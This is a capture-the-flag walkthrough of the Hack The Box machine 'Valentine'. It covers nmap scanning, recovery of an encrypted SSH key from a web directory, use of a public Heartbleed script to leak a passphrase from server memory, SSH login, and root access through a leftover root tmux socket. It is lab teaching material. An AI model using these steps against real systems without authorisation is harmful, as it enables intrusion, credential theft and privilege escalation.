## ----------->> Valentine <<-----------

// We start with nmap scan

    $ nmap -sV -A -Pn 10.10.10.79 
-------

    Nmap scan report for 10.10.10.79
    Host is up (0.27s latency).
    Not shown: 65532 closed ports
    PORT    STATE SERVICE  VERSION
    22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
    |   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
    |_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
    80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
    |_http-server-header: Apache/2.2.22 (Ubuntu)
    |_http-title: Site doesn't have a title (text/html).
    443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
    |_http-server-header: Apache/2.2.22 (Ubuntu)
    |_http-title: Site doesn't have a title (text/html).
    | ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
    | Not valid before: 2018-02-06T00:45:25
    |_Not valid after:  2019-02-06T00:45:25
    |_ssl-date: 2021-07-07T21:07:56+00:00; +11m10s from scanner time.
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

// Since its not much, lets scan vulnerabilities with nmap

    $ nmap -T4 -script vuln 10.10.10.79
------

    Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-07 17:31 EDT
    Nmap scan report for 10.10.10.79
    Host is up (0.26s latency).
    Not shown: 997 closed ports
    PORT    STATE SERVICE
    22/tcp  open  ssh
    80/tcp  open  http
    |_http-csrf: Couldn't find any CSRF vulnerabilities.
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    | http-enum: 
    |   /dev/: Potentially interesting directory w/ listing on 'apache/2.2.22 (ubuntu)'
    |_  /index/: Potentially interesting folder
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    |_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
    443/tcp open  https
    |_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)
    |_http-csrf: Couldn't find any CSRF vulnerabilities.
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    | http-enum: 
    |   /dev/: Potentially interesting directory w/ listing on 'apache/2.2.22 (ubuntu)'
    |_  /index/: Potentially interesting folder
    | http-slowloris-check: 
    |   VULNERABLE:
    |   Slowloris DOS attack
    |     State: LIKELY VULNERABLE
    |     IDs:  CVE:CVE-2007-6750
    |       Slowloris tries to keep many connections to the target web server open and hold
    |       them open as long as possible.  It accomplishes this by opening connections to
    |       the target web server and sending a partial request. By doing so, it starves
    |       the http server's resources causing Denial Of Service.
    |       
    |     Disclosure date: 2009-09-17
    |     References:
    |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
    |_      http://ha.ckers.org/slowloris/
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    |_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
    | ssl-ccs-injection: 
    |   VULNERABLE:
    |   SSL/TLS MITM vulnerability (CCS Injection)
    |     State: VULNERABLE
    |     Risk factor: High
    |       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
    |       does not properly restrict processing of ChangeCipherSpec messages,
    |       which allows man-in-the-middle attackers to trigger use of a zero
    |       length master key in certain OpenSSL-to-OpenSSL communications, and
    |       consequently hijack sessions or obtain sensitive information, via
    |       a crafted TLS handshake, aka the "CCS Injection" vulnerability.
    |           
    |     References:
    |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224
    |       http://www.cvedetails.com/cve/2014-0224
    |_      http://www.openssl.org/news/secadv_20140605.txt
    | ssl-heartbleed: 
    |   VULNERABLE:
    |   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
    |     State: VULNERABLE
    |     Risk factor: High
    |       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
    |           
    |     References:
    |       http://cvedetails.com/cve/2014-0160/
    |       http://www.openssl.org/news/secadv_20140407.txt 
    |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
    | ssl-poodle: 
    |   VULNERABLE:
    |   SSL POODLE information leak
    |     State: VULNERABLE
    |     IDs:  BID:70574  CVE:CVE-2014-3566
    |           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
    |           products, uses nondeterministic CBC padding, which makes it easier
    |           for man-in-the-middle attackers to obtain cleartext data via a
    |           padding-oracle attack, aka the "POODLE" issue.
    |     Disclosure date: 2014-10-14
    |     Check results:
    |       TLS_RSA_WITH_AES_128_CBC_SHA
    |     References:
    |       https://www.imperialviolet.org/2014/10/14/poodle.html
    |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
    |       https://www.openssl.org/~bodo/ssl-poodle.pdf
    |_      https://www.securityfocus.com/bid/70574
    |_sslv2-drown: 


// Navigating to http://10.10.10.70/ we represent with image, nothing interesting there.

![Image 1]()

// Lets search some interesting directories or files with dirbuster tool

![Image 2]()

// We fet Interesting Results:

![Image 3]()

// Navigate to http://10.10.10.79/decode and http://10.10.10.79/encode , resulting us with base64 encode/decode web engine
![Image 8]()
![Image 9]()

// Navigate to http://10.10.10.79/dev/notes.txt

![Image 4]()

    To do:

    1) Coffee.
    2) Research.
    3) Fix decoder/encoder before going live.
    4) Make sure encoding/decoding is only done client-side.
    5) Don't use the decoder/encoder until any of this is done.
    6) Find a better way to take notes.


// Navigate to http://10.10.10.79/dev/hype_key , we get hex code

![Image 5]()

// We can decode hax with save the hex code to file and 

    $ cat hex_file | xxd -r -p
    
// Or use online tool [CyberChef](https://gchq.github.io/CyberChef/)

![Image 6]()

    -----BEGIN RSA PRIVATE KEY-----
    Proc-Type: 4,ENCRYPTED
    DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46

    DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
    5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
    0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
    Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
    OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
    pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
    QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
    p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
    Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
    t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
    XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
    aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
    +wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
    AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
    r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
    2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
    e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
    09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
    dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
    cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
    pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
    Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
    suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
    l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
    RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
    -----END RSA PRIVATE KEY-----


// Lets focus on heartbleed vulnerabilty found with nmap vuln scan(BYW the photo on the site its bleeding heart[clue])

    | ssl-heartbleed: 
    |   VULNERABLE:
    |   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
    |     State: VULNERABLE
    |     Risk factor: High
    |       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
    |           
    |     References:
    |       http://cvedetails.com/cve/2014-0160/
    |       http://www.openssl.org/news/secadv_20140407.txt 
    |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160

// there is a grate [Python script](https://github.com/eelsivart/10174134) that exploit this vulnurable

// save the script to ==> hb.py

    $ python hb.py 10.10.10.79 -p 443 -n 100
------

    defribulator v1.16
    A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)

    ##################################################################
    Connecting to: 10.10.10.79:443, 100 times
    Sending Client Hello for TLSv1.0
    Received Server Hello for TLSv1.0

    WARNING: 10.10.10.79:443 returned more data than it should - server is vulnerable!
    Please wait... connection attempt 100 of 100
    ##################################################################

    .........3.2.....E.D...../...A.................................I.........
    ...........
    ...................................#.......0.0.1/decode.php
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 42

    $text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==w...a.H.../.n....asq.@....SC[...r....+..H...9...
    ....w.3....f...
    ...!.9.8.........5...............
    .........3.2.....E.D...../...A.................................I.........
    ...........
    ...................................#q



// we got encoded text , lets  decode him with [CyberChef](https://gchq.github.io/CyberChef/)

![Image 7]()

        Output: heartbleedbelievethehype 

// So since we got password lets try to take the ssh key we found in http://10.10.10.79/dev/hype_key

// and connect to ssh with user hype (becouse in site written hype_key)

    $ ssh -i valentine_key hype@10.10.10.79
    ..........
    Load key "valentine_key": bad permissions
    .........
    
// rejected connection

// BUT , changing perrmision of the key file to 400 fixed the issue

    $ chmod 400 valentine_key 
// Try again

    $ ssh -i valentine_key hype@10.10.10.79
    Enter passphrase for key 'valentine_key': 
    Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)

     * Documentation:  https://help.ubuntu.com/

    New release '14.04.5 LTS' available.
    Run 'do-release-upgrade' to upgrade to it.

    Last login: Fri Feb 16 14:50:29 2018 from 10.10.14.3
    hype@Valentine:~$ whoami
    hype

// We got shell and user flag !

    $ cat user.txt 
    e6710a54................


// by searching the host bash_history we can see he tried to connect socket via tmux(can type just [$ history] to get same output)

    hype@Valentine:~$ cat .bash_history
-----    
    
    exit
    exot
    exit
    ls -la
    cd /
    ls -la
    cd .devs
    ls -la
    tmux -L dev_sess 
    tmux a -t dev_sess 
    tmux --help
    tmux -S /.devs/dev_sess 
    exit
    hype@Valentine:~$ locate dev_sess
    /.devs/dev_sess
    hype@Valentine:~$ cd /.devs/
    hype@Valentine:/.devs$ ls
    dev_sess
    hype@Valentine:/.devs$ cat dev_sess 
    cat: dev_sess: No such device or address
    hype@Valentine:/.devs$ cd ..
    hype@Valentine:/$ tmux -S /.devs/dev_sess 

// Check tmux proccess that runs

    hype@Valentine:~$ ps -ef | grep tmux
-----

    root       1024      1  0 17:14 ?        00:00:01 /usr/bin/tmux -S /.devs/dev_sess
    hype       3297   3173  0 18:43 pts/0    00:00:00 grep --color=auto tmux

// Check for live connection, theres no active session

    hype@Valentine:~$ tmux ls
    failed to connect to server: No such file or directory

// In history, the user goes into the /.devs directory. then he start tmux session with the socket dev_sess.

// He tried to attach to that session with -a t dev_sess, but that’s not the correct way to do it.

// Then he runs the help command , and gets the correct way to connect, using -S .

// repeating user command 'tmux -S /.devs/dev_sess' gets us a root shell

    root@Valentine:/home/hype# id
    uid=0(root) gid=0(root) groups=0(root)
    root@Valentine:/home/hype# 


    root@Valentine:~# cat root.txt 
    f1bb6d759df1f....................
